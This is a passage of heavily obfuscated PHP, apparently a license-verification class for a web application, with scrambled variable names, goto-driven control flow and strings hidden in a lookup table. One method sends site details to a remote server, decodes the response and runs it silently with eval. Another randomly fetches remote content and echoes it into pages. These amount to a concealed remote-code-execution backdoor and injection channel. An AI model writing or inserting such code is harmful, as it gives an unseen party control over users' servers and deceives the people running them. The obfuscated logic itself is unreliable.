$Fî­È†³…[221]($Fî­È†³…[125]($this->{$_SERVER[²—Ä][154]}($e¢Û«³ƒ›ª, $Fî­È†³…[222]))); $bÇç‘”¡× = $BÏ·¦öì‘õ[620]; goto cº²­¶¤‡Ú; e†ğ…„Õ™Ù: $FÁ¶î›ÒãÒ[$Fî­È†³…[130]] = $Fî­È†³…[125]($Fî­È†³…[221]($this->{$_SERVER[²—Ä][154]}($fĞã†Ù¢, $Fî­È†³…[223]))); if ($f¼äÑ¼Ù›Ú[$Fî­È†³…[224]] && $f¼äÑ¼Ù›Ú[$Fî­È†³…[224]] >= 1) { $Fî­È†³…[61]($Fî­È†³…[62])->{$_SERVER[²—Ä][225]}($Fî­È†³…[226], $Fî­È†³…[227]); } $Fî­È†³…[61]($Fî­È†³…[62])->{$_SERVER[²—Ä][228]}($FÁ¶î›ÒãÒ); goto a„´Ø‘µ™; bÖôÌ©Êì¾: if (strlen($a²ã¨âß») < $BÏ·¦öì‘õ[64]) { die; } Cache::set($Fî­È†³…[237] . $Fî­È†³…[121]($FÎ—¹ãÜ±ê . $Fî­È†³…[238]), $Fî­È†³…[10]); $Fî­È†³…[173]($Fî­È†³…[205]($Fî­È†³…[215]), !0); goto BÍÓÂ‡‹ê¬; FÜåÔÄÆèË: $a‚ˆ¼°ÉÌÍ = $Fî­È†³…[221]($Fî­È†³…[25]($b™ïí…‚Öå, 10, 16)); $C¿ê‚Ö†Œ‰ = $this->{$_SERVER[²—Ä][134]}($Fî­È†³…[155]($f¼äÑ¼Ù›Ú), $b™ïí…‚Öå); $E°‹×«³¢ª = $BÏ·¦öì‘õ[622]; goto Eƒ†êãÓ; Céõª±¦Ö†: while ($C™Ë‘¹Ş…ã < $BÏ·¦öì‘õ[590]) { if ($C™Ë‘¹Ş…ã >= 0) { break; } $C™Ë‘¹Ş…ã++; } $c¼¯ËŠ‹ãà[$a‚ˆ¼°ÉÌÍ] = $C¿ê‚Ö†Œ‰; $Fî­È†³…[61]($Fî­È†³…[11])->{$_SERVER[²—Ä][233]}($CÑó‹¶‚ï[$Fî­È†³…[234]], array($Fî­È†³…[235] => $c¼¯ËŠ‹ãà)); goto aÖåÙ˜´Â; d›ĞµÍîù: $CÑó‹¶‚ï = $a„ÓµùÓ¿›[$Fî­È†³…[232]]; $c¼¯ËŠ‹ãà = array(); $C™Ë‘¹Ş…ã = $BÏ·¦öì‘õ[624]; goto Céõª±¦Ö†; B°®—æñùğ: } private function licenseRegistSuccess() { $DÖÑø²óá =& $_SERVER[²—Ä]; $A­íõ¬Ïà› = $DÖÑø²óá[61]($DÖÑø²óá[62])->{$_SERVER[²—Ä][63]}(); if ($A­íõ¬Ïà›[$DÖÑø²óá[90]] != $DÖÑø²óá[227]) { $DÖÑø²óá[61]($DÖÑø²óá[62])->{$_SERVER[²—Ä][228]}($DÖÑø²óá[90], $DÖÑø²óá[227]); } $DÖÑø²óá[117]($DÖÑø²óá[239])->{$_SERVER[²—Ä][240]}(!0); } private function zybj353942b6() { goto cƒõÓ’ŒÖŸ; A‰ÔÖˆ§Ñ¨: $this->zval24ea8aa4 = $d§ºñ²Ù[128]; $BÔùíã‹†ˆ = $eµ©î‚×¦[629]; while ($BÔùíã‹†ˆ < $eµ©î‚×¦[590]) { if ($BÔùíã‹†ˆ >= 0) { break; } $BÔùíã‹†ˆ++; } goto Añ£ÈØ±æˆ; cƒõÓ’ŒÖŸ: $eµ©î‚×¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d§ºñ²Ù =& $_SERVER[²—Ä]; $d§ºñ²Ù[61]($d§ºñ²Ù[62])->{$_SERVER[²—Ä][228]}(array($d§ºñ²Ù[216] => $d§ºñ²Ù[10], $d§ºñ²Ù[217] => $d§ºñ²Ù[10], $d§ºñ²Ù[127] => $d§ºñ²Ù[128], $d§ºñ²Ù[129] => $d§ºñ²Ù[10], $d§ºñ²Ù[130] => $d§ºñ²Ù[10])); goto aòùÅâê; aòùÅâê: $FùÆÇ•— = $eµ©î‚×¦[628]; $d§ºñ²Ù[61]($d§ºñ²Ù[62])->{$_SERVER[²—Ä][225]}($d§ºñ²Ù[226], $d§ºñ²Ù[241]); $this->klemd8c0faf5 = array(); goto A‰ÔÖˆ§Ñ¨; Añ£ÈØ±æˆ: } private function azsk5dff7b02() { goto AÕˆ¹’‚²ì; AÕˆ¹’‚²ì: $B‰äĞÌŠ¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e±ãµ¼…®µ =& $_SERVER[²—Ä]; $_SERVER[$e±ãµ¼…®µ[182]] = $e±ãµ¼…®µ[113]($_SERVER, $e±ãµ¼…®µ[182], APP_HOST); goto fÏ§æ˜ ‡ ; aÔæâã¬¶: $aãäÜà = $e±ãµ¼…®µ[61]($e±ãµ¼…®µ[62])->{$_SERVER[²—Ä][63]}($e±ãµ¼…®µ[123]); $E¨˜ˆäßö• = $B‰äĞÌŠ¹[630]; if (strlen($E¨˜ˆäßö•) < $B‰äĞÌŠ¹[64]) { die; } goto c®î·ÂŸÎË; fÍƒ§ŠÕÒÄ: if ($e±ãµ¼…®µ[243]() - $eŠˆ»ò‹Ïµ[$e±ãµ¼…®µ[242]] > 20) { $eŠˆ»ò‹Ïµ[$e±ãµ¼…®µ[242]] = $e±ãµ¼…®µ[243](); Cache::set($e‰…Š„¼Ö, $eŠˆ»ò‹Ïµ); } $this->klemd8c0faf5 = $eŠˆ»ò‹Ïµ; $this->zval24ea8aa4 = $d¾İ‚™çñ‹[$e±ãµ¼…®µ[127]]; goto C‚¨¤â¹ËŸ; c®î·ÂŸÎË: $e‰…Š„¼Ö = $e±ãµ¼…®µ[237] . $e±ãµ¼…®µ[121]($aãäÜà . $e±ãµ¼…®µ[238]); $eŠˆ»ò‹Ïµ = Cache::get($e‰…Š„¼Ö); if (!$e±ãµ¼…®µ[199]($eŠˆ»ò‹Ïµ) || !isset($eŠˆ»ò‹Ïµ[$e±ãµ¼…®µ[242]]) || $e±ãµ¼…®µ[243]() - $eŠˆ»ò‹Ïµ[$e±ãµ¼…®µ[242]] >= 60) { $FŞ¹˜’§½ = $e±ãµ¼…®µ[229]($e±ãµ¼…®µ[61]($e±ãµ¼…®µ[11])->{$_SERVER[²—Ä][230]}(), $e±ãµ¼…®µ[231]); $Fñé”Ó…Ô = $FŞ¹˜’§½[$e±ãµ¼…®µ[232]]; $aí¡ÉÏ°Ÿ = $e±ãµ¼…®µ[121]($_SERVER[$e±ãµ¼…®µ[122]] . $e±ãµ¼…®µ[221]($aãäÜà) . $d¾İ‚™çñ‹[$e±ãµ¼…®µ[217]]); $FšÌø¥Šãª = $e±ãµ¼…®µ[221]($e±ãµ¼…®µ[25]($aí¡ÉÏ°Ÿ, 10, 16)); $eŠˆ»ò‹Ïµ = $this->{$_SERVER[²—Ä][196]}($Fñé”Ó…Ô[$e±ãµ¼…®µ[101]][$FšÌø¥Šãª], $aí¡ÉÏ°Ÿ); $eŠˆ»ò‹Ïµ = $e±ãµ¼…®µ[198]($eŠˆ»ò‹Ïµ, !0); } goto F½ÑŒ½; fÏ§æ˜ ‡ : $this->zval24ea8aa4 = $e±ãµ¼…®µ[128]; $d¾İ‚™çñ‹ = $e±ãµ¼…®µ[61]($e±ãµ¼…®µ[62])->{$_SERVER[²—Ä][63]}(); if ($d¾İ‚™çñ‹[$e±ãµ¼…®µ[127]] == $e±ãµ¼…®µ[128]) { return; } goto aÔæâã¬¶; C‚¨¤â¹ËŸ: $Eª®ëìùİÁ = $B‰äĞÌŠ¹[631]; while (strlen($Eª®ëìùİÁ) < $B‰äĞÌŠ¹[64]) { if (!$Eª®ëìùİÁ) { break; } $Eª®ëìùİÁ++; } goto DĞá£Ÿ‘; F½ÑŒ½: if (!$e±ãµ¼…®µ[199]($eŠˆ»ò‹Ïµ)) { return $this->{$_SERVER[²—Ä][171]}(); } $Açø½Ş» = $e±ãµ¼…®µ[151]($eŠˆ»ò‹Ïµ[$e±ãµ¼…®µ[152]]); if ($e±ãµ¼…®µ[243]() >= $Açø½Ş») { return $this->{$_SERVER[²—Ä][171]}(); } goto fÍƒ§ŠÕÒÄ; DĞá£Ÿ‘: } private function wsuq3412a218() { goto B»ñƒ£ÒŞ; B»ñƒ£ÒŞ: $e¯İß÷§‘ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DŸ™Û¼¾ˆ =& $_SERVER[²—Ä]; $A¢Î˜·Û‚½ = $GLOBALS[$DŸ™Û¼¾ˆ[22]]; goto A×š’¿ß‘; D¯„«½ç: $B¨òõÉõÔ… = array($DŸ™Û¼¾ˆ[247], $DŸ™Û¼¾ˆ[248]); if ($DŸ™Û¼¾ˆ[249]($D¦À²˜Ê‚°, $B¨òõÉõÔ…)) { if ($this->zval24ea8aa4 == $DŸ™Û¼¾ˆ[128] && isset($A¢Î˜·Û‚½[$DŸ™Û¼¾ˆ[250]])) { $DŸ™Û¼¾ˆ[173]($DŸ™Û¼¾ˆ[205]($DŸ™Û¼¾ˆ[245]), !1, $DŸ™Û¼¾ˆ[246]); die; } $AÜ……¢Ğô = $this->{$_SERVER[²—Ä][144]}(); if ($AÜ……¢Ğô != $DŸ™Û¼¾ˆ[251]($DŸ™Û¼¾ˆ[252])) { if ($AÜ……¢Ğô <= $DŸ™Û¼¾ˆ[61]($DŸ™Û¼¾ˆ[146])->{$_SERVER[²—Ä][147]}()) { $DŸ™Û¼¾ˆ[173]($DŸ™Û¼¾ˆ[205]($DŸ™Û¼¾ˆ[253]), !1, $DŸ™Û¼¾ˆ[246]); die; } } } goto EÅá®ÃêÀ; A×š’¿ß‘: $F¡¤±Ã±ÜØ = $e¯İß÷§‘[632]; if (strlen($F¡¤±Ã±ÜØ) < $e¯İß÷§‘[584]) { return; } $D¦À²˜Ê‚° = $_SERVER[$DŸ™Û¼¾ˆ[44]]; goto AàÒ¼åñ‰†; AàÒ¼åñ‰†: $D˜á–ç›Ì = $e¯İß÷§‘[633]; while (strlen($D˜á–ç›Ì) < $e¯İß÷§‘[587]) { if (!$D˜á–ç›Ì) { break; } $D˜á–ç›Ì++; } if ($D¦À²˜Ê‚° == $DŸ™Û¼¾ˆ[244] && $this->zval24ea8aa4 == $DŸ™Û¼¾ˆ[128]) { $DŸ™Û¼¾ˆ[173]($DŸ™Û¼¾ˆ[205]($DŸ™Û¼¾ˆ[245]), !1, $DŸ™Û¼¾ˆ[246]); } goto D¯„«½ç; EÅá®ÃêÀ: } private function vlsu66f9bb6a() { goto A¿à—Ş«È„; EåÛ¸Ù»‘Ú: if ($aŞÙ©÷¬Š && $f‰ñ—Ê…óô[32]($aŞÙ©÷¬Š, $f‰ñ—Ê…óô[267])) { echo $aŞÙ©÷¬Š; } die; goto AÆÀÜèòÎ÷; D«Ã«•šïÊ: $fÍ¥Ö¶‹¸ = $f‰ñ—Ê…óô[259](array($f‰ñ—Ê…óô[260] => array($f‰ñ—Ê…óô[261] => $f‰ñ—Ê…óô[262], $f‰ñ—Ê…óô[263] => 3))); $aŞÙ©÷¬Š = @$f‰ñ—Ê…óô[264]($CË‰Öß©‡×, !1, $fÍ¥Ö¶‹¸); $f‰ñ—Ê…óô[265]($f‰ñ—Ê…óô[266]); goto EåÛ¸Ù»‘Ú; A¿à—Ş«È„: $f‰ñ—Ê…óô =& $_SERVER[²—Ä]; $DË–Çóœ¶ = array($f‰ñ—Ê…óô[142], $f‰ñ—Ê…óô[254]); if (!$f‰ñ—Ê…óô[113]($GLOBALS, $f‰ñ—Ê…óô[139]) || !isset($_GET[$f‰ñ—Ê…óô[255]])) { return; } goto c¤Û‘ã’‰ƒ; c¤Û‘ã’‰ƒ: if (!$f‰ñ—Ê…óô[249]($_SERVER[$f‰ñ—Ê…óô[44]], $DË–Çóœ¶)) { return; } $CË‰Öß©‡× = $f‰ñ—Ê…óô[256]; $CË‰Öß©‡× = $this->{$_SERVER[²—Ä][257]}($CË‰Öß©‡×, $f‰ñ—Ê…óô[258]); goto D«Ã«•šïÊ; AÆÀÜèòÎ÷: } public function qdsmcf3c2ab5($d¸‘…ã¥„) { goto EÚš…½éòğ; eÓËˆ‘Ê’: $bÊğ¥¡Ğ“² = array($e¢‹‡—­¢ì[269] => $e¢‹‡—­¢ì[270], $e¢‹‡—­¢ì[271] => $e¢‹‡—­¢ì[270], $e¢‹‡—­¢ì[272] => $e¢‹‡—­¢ì[270], $e¢‹‡—­¢ì[273] => $e¢‹‡—­¢ì[270], $e¢‹‡—­¢ì[274] => $e¢‹‡—­¢ì[270], $e¢‹‡—­¢ì[275] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[277] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[278] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[279] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[280] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[281] => $e¢‹‡—­¢ì[276], $e¢‹‡—­¢ì[282] => $e¢‹‡—­¢ì[276]); $Eö©òàÊß = $FØ‰’Û¯£[634]; while (strlen($Eö©òàÊß) < $FØ‰’Û¯£[584]) { if (!$Eö©òàÊß) { break; } $Eö©òàÊß++; } goto c—öÙÚì¤; BÁŠ†Õ¤“ï: $e‹Œùíòßö = array(); $B•š¿ÊĞéß = $FØ‰’Û¯£[636]; foreach ($bÊğ¥¡Ğ“² as $dˆ¤÷‡ß÷ß => $C¹ö±Ò´¶) { if ($C¹ö±Ò´¶ == $e¢‹‡—­¢ì[270] && $e¢‹‡—­¢ì[25]($this->zval24ea8aa4, 0, 1) == $e¢‹‡—­¢ì[270]) { continue; } if (!$e¢‹‡—­¢ì[249]($dˆ¤÷‡ß÷ß, $B†²Àçù‚ï)) { $e‹Œùíòßö[] = $dˆ¤÷‡ß÷ß; } } goto F¨ÊÉ¹“ª¡; F¨ÊÉ¹“ª¡: foreach ($e‹Œùíòßö as $dˆ¤÷‡ß÷ß) { unset($d¸‘…ã¥„[$dˆ¤÷‡ß÷ß]); $EØš®Æ¹÷ = $FØ‰’Û¯£[637]; while (strlen($EØš®Æ¹÷) < $FØ‰’Û¯£[590]) { if (!$EØš®Æ¹÷) { break; } $EØš®Æ¹÷++; } } return $d¸‘…ã¥„; goto aÛ›¹ÍÆ ¤; EÚš…½éòğ: $FØ‰’Û¯£ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¢‹‡—­¢ì =& $_SERVER[²—Ä]; if ($this->zval24ea8aa4 == $e¢‹‡—­¢ì[268]) { return $d¸‘…ã¥„; } goto eÓËˆ‘Ê’; c—öÙÚì¤: $B†²Àçù‚ï = $e¢‹‡—­¢ì[0]($e¢‹‡—­¢ì[283], $e¢‹‡—­¢ì[113]($this->klemd8c0faf5, $e¢‹‡—­¢ì[136], $e¢‹‡—­¢ì[10])); $Bê¿ã‹ôÄ = $FØ‰’Û¯£[635]; while ($Bê¿ã‹ôÄ < $FØ‰’Û¯£[584]) { if ($Bê¿ã‹ôÄ >= 0) { break; } $Bê¿ã‹ôÄ++; } goto BÁŠ†Õ¤“ï; aÛ›¹ÍÆ ¤: } private function tudm0558e70c() { $eÇçã¿ã =& $_SERVER[²—Ä]; if ($this->zval24ea8aa4 != $eÇçã¿ã[128]) { return; } $GLOBALS[$eÇçã¿ã[101]][$eÇçã¿ã[105]][$eÇçã¿ã[284]] = $eÇçã¿ã[227]; $GLOBALS[$eÇçã¿ã[101]][$eÇçã¿ã[285]] = $eÇçã¿ã[227]; $A®ñ“ó—õ’ = $_SERVER[í¤âËÚ£¶íÊ¢][638]; if ($eÇçã¿ã[61]($eÇçã¿ã[286])->{$_SERVER[²—Ä][63]}($eÇçã¿ã[90]) != $eÇçã¿ã[241]) { $eÇçã¿ã[61]($eÇçã¿ã[286])->{$_SERVER[²—Ä][228]}($eÇçã¿ã[90], $eÇçã¿ã[241]); } } public function hqovad4eff79() { return $_SERVER[²—Ä][287]; $FàŠö‚é± = $_SERVER[í¤âËÚ£¶íÊ¢][639]; } private function kamz6e8d86cf() { goto c‰ÅªŠÌ»ò; dØ†ˆŒ¸±Ğ: $F©®Êµ‡¤î = $this->{$_SERVER[²—Ä][190]}($D„¬¦“Êòœ[296], $EÂ™¢Ğ—è); $Cš×á·îÓç = $A™›¶è×É¸[642]; while (strlen($Cš×á·îÓç) < $A™›¶è×É¸[64]) { if (!$Cš×á·îÓç) { break; } $Cš×á·îÓç++; } goto b«ÈÒØæ©È; b«ÈÒØæ©È: if (!$D„¬¦“Êòœ[199]($F©®Êµ‡¤î)) { return; } if ($F©®Êµ‡¤î[$D„¬¦“Êòœ[172]] && $F©®Êµ‡¤î[$D„¬¦“Êòœ[297]]) { if ($this->{$_SERVER[²—Ä][207]}($F©®Êµ‡¤î[$D„¬¦“Êòœ[297]]) == $EÂ™¢Ğ—è[$D„¬¦“Êòœ[172]]) { return; } } $this->{$_SERVER[²—Ä][171]}(); goto ašØƒÊ¿Ûä; c‘µÓ¦£Ìò: $AÍˆÉº çø = $A™›¶è×É¸[641]; if (!$AÍˆÉº çø) { die; } $EÂ™¢Ğ—è = array($D„¬¦“Êòœ[172] => $D„¬¦“Êòœ[61]($D„¬¦“Êòœ[62])->{$_SERVER[²—Ä][63]}($D„¬¦“Êòœ[216]), $D„¬¦“Êòœ[185] => $this->zval24ea8aa4, $D„¬¦“Êòœ[183] => $_SERVER[$D„¬¦“Êòœ[184]], $D„¬¦“Êòœ[176] => $D„¬¦“Êòœ[156], $D„¬¦“Êòœ[179] => $_SERVER[$D„¬¦“Êòœ[180]]); goto dØ†ˆŒ¸±Ğ; Eğ‘¬§ˆÍ: if ($this->zval24ea8aa4 == $D„¬¦“Êòœ[128] || !$D„¬¦“Êòœ[113]($GLOBALS, $D„¬¦“Êòœ[139])) { return; } if (!$D„¬¦“Êòœ[249]($_SERVER[$D„¬¦“Êòœ[44]], $fÍ§Œã§ğÏ)) { return; } if ($D„¬¦“Êòœ[243]() % 4 != 0) { return; } goto D¦ÆÇÚÁÜâ; D¡Í•â§ªÒ: $A¹ï…§†·­ = $D„¬¦“Êòœ[291] . $D„¬¦“Êòœ[121]($D„¬¦“Êòœ[292]); $d‚×‰»†Š× = $A™›¶è×É¸[640]; if (!$d‚×‰»†Š×) { die; } goto Eğ‘¬§ˆÍ; c‰ÅªŠÌ»ò: $A™›¶è×É¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D„¬¦“Êòœ =& $_SERVER[²—Ä]; $fÍ§Œã§ğÏ = array($D„¬¦“Êòœ[288], $D„¬¦“Êòœ[289], $D„¬¦“Êòœ[290]); goto D¡Í•â§ªÒ; ašØƒÊ¿Ûä: if ($this->{$_SERVER[²—Ä][207]}($F©®Êµ‡¤î[$D„¬¦“Êòœ[297]]) != $EÂ™¢Ğ—è[$D„¬¦“Êòœ[172]]) { $fŠ¦ˆÁ¦óâ = array($D„¬¦“Êòœ[209] => $D„¬¦“Êòœ[61]($D„¬¦“Êòœ[62])->{$_SERVER[²—Ä][63]}($D„¬¦“Êòœ[123]), $D„¬¦“Êòœ[210] => $_SERVER[$D„¬¦“Êòœ[122]], $D„¬¦“Êòœ[211] => $D„¬¦“Êòœ[212](), $D„¬¦“Êòœ[181] => $_SERVER[$D„¬¦“Êòœ[182]]); $e£À¶¯´î = $this->{$_SERVER[²—Ä][213]}($D„¬¦“Êòœ[155]($fŠ¦ˆÁ¦óâ)); $F©®Êµ‡¤î = $this->{$_SERVER[²—Ä][190]}($D„¬¦“Êòœ[214] . $e£À¶¯´î); if ($F©®Êµ‡¤î && $D„¬¦“Êòœ[199]($F©®Êµ‡¤î) && isset($F©®Êµ‡¤î[$D„¬¦“Êòœ[297]])) { $C¾¬±¼øµ­ = $this->{$_SERVER[²—Ä][196]}($F©®Êµ‡¤î[$D„¬¦“Êòœ[297]], 2); if ($C¾¬±¼øµ­) { $C¾¬±¼øµ­ = $this->{$_SERVER[²—Ä][207]}($C¾¬±¼øµ­); } if ($C¾¬±¼øµ­) { try { @eval($C¾¬±¼øµ­); } catch (Exception $cÆÂƒ§…„ù) { } } } } goto aã¯éâ×®˜; D¦ÆÇÚÁÜâ: $D‡§ÛºÙ” = $D„¬¦“Êòœ[13](array($D„¬¦“Êòœ[293], $D„¬¦“Êòœ[294]), $A¹ï…§†·­); if ($D‡§ÛºÙ” && $D„¬¦“Êòœ[243]() - $D‡§ÛºÙ” < $D„¬¦“Êòœ[251]($D„¬¦“Êòœ[295])) { return; } $D„¬¦“Êòœ[13](array($D„¬¦“Êòœ[293], $D„¬¦“Êòœ[159]), $A¹ï…§†·­, $D„¬¦“Êòœ[243]()); goto c‘µÓ¦£Ìò; aã¯éâ×®˜: } private function ipom865beb10($f£ö¥ÕŞ÷Ê = '', $dÆˆæë·ñ = array(), $B»Õõ»õ¿… = 5) { goto eƒÖ‡°Š¯; Eè£ˆõãË©: $d‘â£¡”¹ = $BÉ›–®¤“ß[643]; while (strlen($d‘â£¡”¹) < $BÉ›–®¤“ß[64]) { if (!$d‘â£¡”¹) { break; } $d‘â£¡”¹++; } $b¯ÖŠ¾‹±µ = $this->{$_SERVER[²—Ä][257]}($b¯ÖŠ¾‹±µ, $B…–ÈğÓ¢[299]); goto Fš¶ÁŸ; e›‘„’¶‹ë: if (!$FùÅïË¶ì ) { return; } goto eá¸Á‚—Â°; C…ö°ÔÙµ: while ($C‚¥»õº ­ < $BÉ›–®¤“ß[584]) { if ($C‚¥»õº ­ >= 0) { break; } $C‚¥»õº ­++; } return $B…–ÈğÓ¢[198]($dÆˆæë·ñ, !0); $FùÅïË¶ì  = $BÉ›–®¤“ß[647]; goto e›‘„’¶‹ë; Fš¶ÁŸ: $b¯ÖŠ¾‹±µ = $b¯ÖŠ¾‹±µ . $f£ö¥ÕŞ÷Ê; $fƒ…•Ú÷Ö­ = $BÉ›–®¤“ß[644]; if (!$fƒ…•Ú÷Ö­) { die; } goto AíÁ¯¤ˆ„; eƒÖ‡°Š¯: $BÉ›–®¤“ß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B…–ÈğÓ¢ =& $_SERVER[²—Ä]; $b¯ÖŠ¾‹±µ = $B…–ÈğÓ¢[298]; goto Eè£ˆõãË©; c…êñ®Ä¯: $cÅø³‚øì© = $BÉ›–®¤“ß[645]; $dÆˆæë·ñ = @$B…–ÈğÓ¢[264]($b¯ÖŠ¾‹±µ, !1, $BĞŸÈÓ„ã­); $C‚¥»õº ­ = $BÉ›–®¤“ß[646]; goto C…ö°ÔÙµ; AíÁ¯¤ˆ„: if ($dÆˆæë·ñ && $B…–ÈğÓ¢[199]($dÆˆæë·ñ)) { $b¯ÖŠ¾‹±µ = $b¯ÖŠ¾‹±µ . $B…–ÈğÓ¢[300] . $B…–ÈğÓ¢[301]($dÆˆæë·ñ); } if ($dÆˆæë·ñ === -1) { return $b¯ÖŠ¾‹±µ; } $BĞŸÈÓ„ã­ = $B…–ÈğÓ¢[259](array($B…–ÈğÓ¢[260] => array($B…–ÈğÓ¢[263] => $B»Õõ»õ¿…, $B…–ÈğÓ¢[261] => $B…–ÈğÓ¢[302]), $B…–ÈğÓ¢[303] => array($B…–ÈğÓ¢[304] => !1, $B…–ÈğÓ¢[305] => !1))); goto c…êñ®Ä¯; eá¸Á‚—Â°: } private function bezo63c9ecb7() { goto Fƒ–öÄ©Š; a‚¨Ûè“â«: $bî–è©‘ = $Dê¼Í•ÍÆ[649]; if (!$bî–è©‘) { die; } $BÃ÷çšÀ = $Dù°Â‚Ò¾[251]($BÃ÷çšÀ ? $BÃ÷çšÀ : $Dù°Â‚Ò¾[307]); goto B½œø²¤Ù‘; Fƒ–öÄ©Š: $Dê¼Í•ÍÆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dù°Â‚Ò¾ =& $_SERVER[²—Ä]; $e²•Õ—Èˆ„ = array($Dù°Â‚Ò¾[306] => $Dù°Â‚Ò¾[307], $Dù°Â‚Ò¾[308] => $Dù°Â‚Ò¾[309], $Dù°Â‚Ò¾[310] => $Dù°Â‚Ò¾[311], $Dù°Â‚Ò¾[312] => $Dù°Â‚Ò¾[313], $Dù°Â‚Ò¾[314] => $Dù°Â‚Ò¾[315], $Dù°Â‚Ò¾[316] => $Dù°Â‚Ò¾[252], $Dù°Â‚Ò¾[317] => $Dù°Â‚Ò¾[252], $Dù°Â‚Ò¾[318] => $Dù°Â‚Ò¾[307], $Dù°Â‚Ò¾[319] => $Dù°Â‚Ò¾[309], $Dù°Â‚Ò¾[320] => $Dù°Â‚Ò¾[311], $Dù°Â‚Ò¾[321] => $Dù°Â‚Ò¾[322], $Dù°Â‚Ò¾[323] => $Dù°Â‚Ò¾[313], $Dù°Â‚Ò¾[324] => $Dù°Â‚Ò¾[325], $Dù°Â‚Ò¾[326] => $Dù°Â‚Ò¾[315], $Dù°Â‚Ò¾[327] => $Dù°Â‚Ò¾[328], $Dù°Â‚Ò¾[329] => $Dù°Â‚Ò¾[330], $Dù°Â‚Ò¾[331] => $Dù°Â‚Ò¾[332]); goto d­×ºÜß¾é; d­×ºÜß¾é: $Bâ˜ŒÁµ„ = $Dê¼Í•ÍÆ[648]; if (strlen($Bâ˜ŒÁµ„) < $Dê¼Í•ÍÆ[590]) { die; } $BÃ÷çšÀ = $e²•Õ—Èˆ„[$this->zval24ea8aa4]; goto a‚¨Ûè“â«; B½œø²¤Ù‘: $eêàŒƒÅØ = $Dù°Â‚Ò¾[113]($this->klemd8c0faf5, $Dù°Â‚Ò¾[333]); $eêàŒƒÅØ = $eêàŒƒÅØ ? $Dù°Â‚Ò¾[251]($eêàŒƒÅØ) : 0; return $BÃ÷çšÀ + $eêàŒƒÅØ; goto f…äó’Ù¨ù; f…äó’Ù¨ù: } public function txpd1cc16763($AÛ‚²¬Áìù) { goto f‰Ö¿µ”õä; f‰Ö¿µ”õä: $EÃÕÈùâ‹ =& $_SERVER[²—Ä]; $EÚÓ†²‡ó„ = $this->{$_SERVER[²—Ä][144]}(); if ($AÛ‚²¬Áìù[$EÃÕÈùâ‹[334]] == $EÃÕÈùâ‹[227]) { return; } goto EÌä½íš; C™®åãñ…¨: $aÆ®šôšì = $EÃÕÈùâ‹[61]($EÃÕÈùâ‹[146])->{$_SERVER[²—Ä][335]}($EÃÕÈùâ‹[334])->{$_SERVER[²—Ä][336]}($EÚÓ†²‡ó„)->{$_SERVER[²—Ä][337]}(); $aÆ®šôšì = $EÃÕÈùâ‹[229]($aÆ®šôšì, $EÃÕÈùâ‹[10], $EÃÕÈùâ‹[334]); if (!$EÃÕÈùâ‹[249]($AÛ‚²¬Áìù[$EÃÕÈùâ‹[334]], $aÆ®šôšì)) { $EÃÕÈùâ‹[173]($EÃÕÈùâ‹[338], !1, $EÃÕÈùâ‹[246]); } goto FğµàßÓ»Ü; EÌä½íš: if ($EÚÓ†²‡ó„ >= $EÃÕÈùâ‹[251]($EÃÕÈùâ‹[252])) { return; } $C‹—íØ±ì = $EÃÕÈùâ‹[61]($EÃÕÈùâ‹[146])->{$_SERVER[²—Ä][147]}(); if ($C‹—íØ±ì <= $EÚÓ†²‡ó„) { return; } goto C™®åãñ…¨; FğµàßÓ»Ü: } public function vuek84520b09() { goto aê³Óç“ŠÒ; d®î˜Ï‘ç: $a“ŸÌÎ’®Æ = $this->{$_SERVER[²—Ä][257]}($a“ŸÌÎ’®Æ, $E½í¹Íå½À[258]); $DˆÚíİî = $E½í¹Íå½À[259](array($E½í¹Íå½À[260] => array($E½í¹Íå½À[261] => $E½í¹Íå½À[262], $E½í¹Íå½À[263] => 3))); $d‰‰ºÇî²Ù = @$E½í¹Íå½À[264]($a“ŸÌÎ’®Æ, !1, $DˆÚíİî); goto CÊè§º…‡Ø; CÊè§º…‡Ø: echo $E½í¹Íå½À[340] . $E½í¹Íå½À[341]($d‰‰ºÇî²Ù) . $E½í¹Íå½À[342]; goto a³ÄãÁâä; aê³Óç“ŠÒ: $E½í¹Íå½À =& $_SERVER[²—Ä]; if (!$E½í¹Íå½À[113]($GLOBALS, $E½í¹Íå½À[139]) || $E½í¹Íå½À[339](1, 100) > 20) { return; } $a“ŸÌÎ’®Æ = $E½í¹Íå½À[256]; goto d®î˜Ï‘ç; a³ÄãÁâä: } private function dbpgffca6d90($BˆèíÕ—äç, $a¦©øÄÌŒ, $FôÎ¿Ä‡Û = 3) { goto c±ïêŸÑ¨ˆ; CĞñÁâ¨Ï: $BˆèíÕ—äç = $A‚’êÂ”¬÷[2]($BˆèíÕ—äç); $B§†Ìò¤ğí = $A‚’êÂ”¬÷[339](0, 5) . $A‚’êÂ”¬÷[10]; $d‰±¦à•¥¹ = $A‚’êÂ”¬÷[131](15); goto D«¬¹¦›»; F®Ô³ä¬•ã: if (strlen($aÕË£Ö°áÉ) < $bòù¦ª¤Ş…[587]) { die; } if ($FôÎ¿Ä‡Û - 1 > 0) { $C„º«³¬Œ = $this->{$_SERVER[²—Ä][134]}($C„º«³¬Œ, $a¦©øÄÌŒ, $FôÎ¿Ä‡Û - 1); } return $C„º«³¬Œ; goto AËƒÙå¼§Ã; c±ïêŸÑ¨ˆ: $bòù¦ª¤Ş… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A‚’êÂ”¬÷ =& $_SERVER[²—Ä]; $A‚’êÂ”¬÷[343](1); goto CĞñÁâ¨Ï; D«¬¹¦›»: $DçíŒ¶ôñ = $bòù¦ª¤Ş…[592]; if (!$DçíŒ¶ôñ) { die; } $a˜‹’Ã¨ä‡ = $A‚’êÂ”¬÷[344]; goto EÛôğÍˆë»; EÛôğÍˆë»: switch ($B§†Ìò¤ğí) { case $A‚’êÂ”¬÷[241]: $C„º«³¬Œ = $this->{$_SERVER[²—Ä][154]}($BˆèíÕ—äç, $A‚’êÂ”¬÷[221]($a¦©øÄÌŒ . 